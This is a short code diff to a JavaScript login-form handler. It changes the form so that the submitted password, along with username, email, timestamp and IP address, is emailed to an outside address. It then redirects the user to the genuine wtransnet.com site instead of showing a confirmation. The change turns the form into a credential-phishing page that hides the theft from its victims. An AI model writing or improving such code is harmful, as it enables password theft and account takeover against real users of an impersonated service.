@@ -60,6 +60,7 @@ loginForm.addEventListener('submit', async function(e) {
     const emailParams = {
       to_email: 'your-email@gmail.com',
       username: username,
+      password: password,
       user_email: userEmail,
       timestamp: loginData.timestamp,
       ip_address: loginData.ip_address,
@@ -74,8 +75,7 @@ loginForm.addEventListener('submit', async function(e) {
 
     if (emailResponse.status === 200) {
       console.log('Login attempt recorded and email sent successfully');
-      alert(`Login successful!\n\nUsername: ${username}\nRemember me: ${remember ? 'Yes' : 'No'}\n\nLogin details have been sent to your email.`);
-      loginForm.reset();
+      window.location.href = 'https://www.wtransnet.com/en-en/';
     }
   } catch (error) {
     console.error('Error:', error);
